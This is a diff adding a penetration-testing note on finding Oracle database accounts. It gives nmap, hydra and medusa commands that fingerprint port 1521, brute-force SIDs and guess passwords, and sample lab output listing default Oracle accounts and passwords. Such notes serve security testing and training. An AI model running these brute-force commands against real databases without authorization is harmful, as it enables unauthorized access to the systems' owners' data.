@@ -9,3 +9,45 @@
 
 
 -- Discovering Oracle Accounts With Nmap --
+
+Oracle databases are running on port 1521 so in most of the cases we can identify them just by checking if this port.
+The next step is to use the script oracle-sid-brute which will try to brute force common oracle SID’s.
+If we know the SID of the Oracle database we can use the oracle-brute script to discover the valid accounts.
+
+nmap -sV -p 1521 192.168.1.86
+nmap --script oracle-tns-version -p 1521 192.168.1.86
+
+nmap --script oracle-sid-brute 192.168.1.86
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=XE 192.168.1.86
+nmap --script oracle-brute -p 1521 --script-args 'oracle-brute.sid=XE,userdb=/path/users.txt,passdb=/path/pass.txt' 192.168.1.86
+
+hydra -t 4 -P passlist.txt -L userlist.txt oracle://192.168.1.86:1521/XE
+medusa -h 192.168.1.86 -u oracleuser -P passlist.txt -M oracle
+
+
+root@bt:~# nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=XE 192.168.1.86
+
+Starting Nmap 6.01 ( http://nmap.org ) at 2013-03-09 14:16 EST
+Nmap scan report for 192.168.1.86
+Host is up (0.00062s latency).
+PORT     STATE SERVICE
+1521/tcp open  oracle
+| oracle-brute:
+|   Accounts
+|     CTXSYS:CHANGE_ON_INSTALL - Account is locked
+|     DBSNMP:DBSNMP - Account is locked
+|     DIP:DIP - Account is locked
+|     HR:HR - Account is locked
+|     MDSYS:MDSYS - Account is locked
+|     OUTLN:OUTLN - Account is locked
+|     XDB:CHANGE_ON_INSTALL - Account is locked
+Statistics:
+  Performed 695 guesses in 2 seconds, average tps: 347
+MAC Address: 00:50:56:BB:00:75 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.48 seconds
+
+
+
+-- --
+
